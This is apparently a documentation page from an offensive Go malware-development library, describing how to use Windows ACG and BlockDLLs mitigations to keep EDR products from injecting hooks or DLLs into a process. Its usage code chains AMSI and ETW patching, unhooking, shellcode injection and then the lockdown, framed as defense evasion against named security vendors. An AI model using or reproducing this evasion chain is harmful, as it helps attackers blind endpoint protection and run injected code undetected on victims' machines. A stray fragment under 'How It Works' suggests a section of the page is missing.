# ACG + BlockDLLs

> **MITRE ATT&CK:** T1562.001 -- Impair Defenses: Disable or Modify Tools | **D3FEND:** D3-AIPA -- Application Integrity Protection Analysis | **Detection:** Low

## Primer

Imagine you are in a clean room doing sensitive work. You lock the door so nobody can enter, and you cover all the air vents so nothing can be blown in. That is what ACG and BlockDLLs do to your process.

**ACG (Arbitrary Code Guard)** tells Windows: "Do not allow any new executable memory allocations in this process." Once enabled, nobody -- not even the operating system -- can create new `PAGE_EXECUTE_*` memory regions. This blocks EDR from injecting dynamic hooks or code into your process. It also blocks shellcode injection from outside.

**BlockDLLs (Binary Signature Policy)** tells Windows: "Only load DLLs that are signed by Microsoft." This prevents EDR products from loading their monitoring DLLs (like `CrowdStrike.dll` or `SentinelOne.dll`) into your process. Since these DLLs are typically signed by their vendor (not Microsoft), they are blocked.

Together, these two mitigations create a hardened process that rejects external code injection and unsigned DLL loading. The critical caveat: ACG also prevents your own shellcode from allocating executable memory, so you must apply it AFTER your injection is complete.

## How It Works

    end

**ACG internals:**
- Calls `SetProcessMitigationPolicy` with policy ID 2 (`ProcessDynamicCodePolicy`).
- Sets `ProhibitDynamicCode = 1` in the policy flags.
- Once set, this is **irreversible** for the process lifetime.

**BlockDLLs internals:**
- Calls `SetProcessMitigationPolicy` with policy ID 8 (`ProcessBinarySignaturePolicy`).
- Sets `MicrosoftSignedOnly = 1`.
- Once set, this is **irreversible** for the process lifetime.

## Usage

```go
package main

import (
    "log"

    "github.com/oioio-space/maldev/evasion/acg"
    "github.com/oioio-space/maldev/evasion/blockdlls"
)

func main() {
    // Enable ACG -- no more dynamic code allocation.
    if err := acg.Enable(nil); err != nil {
        log.Fatal(err)
    }

    // Block non-Microsoft DLLs.
    if err := blockdlls.Enable(nil); err != nil {
        log.Fatal(err)
    }
}
```

## Combined Example

```go
package main

import (
    "log"

    "github.com/oioio-space/maldev/evasion"
    "github.com/oioio-space/maldev/evasion/preset"
    "github.com/oioio-space/maldev/inject"
)

func main() {
    shellcode := []byte{0x90, 0x90, 0xCC}

    // 1. FIRST: Evasion (AMSI + ETW + unhook).
    evasion.ApplyAll(preset.Stealth(), nil)

    // 2. SECOND: Inject shellcode (needs executable memory allocation).
    if err := inject.ThreadPoolExec(shellcode); err != nil {
        log.Fatal(err)
    }

    // 3. LAST: Lock down the process.
    //    Aggressive preset includes ACG + BlockDLLs.
    //    WARNING: No more RWX allocations possible after this!
    evasion.ApplyAll(preset.Aggressive(), nil)

    // From this point:
    // - No EDR can inject hooks or DLLs
    // - No new executable memory can be created
    // - The process is hardened for the rest of its lifetime
}
```

## Advantages & Limitations

| Aspect | Detail |
|--------|--------|
| Stealth | High -- uses legitimate Windows mitigation APIs. Looks like a security-conscious application. |
| Effectiveness | Very high -- kernel-enforced. Even ring-0 drivers respect these mitigations (by design). |
| Irreversibility | Both policies are permanent for the process lifetime. Cannot be undone. |
| Order dependency | MUST apply AFTER all shellcode injection and evasion patching is complete. ACG blocks `VirtualProtect` to RX. |
| Compatibility | Windows 10 1709+ (Fall Creators Update). Returns error on older versions. |
| Limitations | `SetProcessMitigationPolicy` is a kernel32 export with no NT equivalent routable through `*wsyscall.Caller`. The `caller` parameter is accepted for API consistency but cannot bypass hooks on this specific function. BlockDLLs may break legitimate third-party DLLs. |
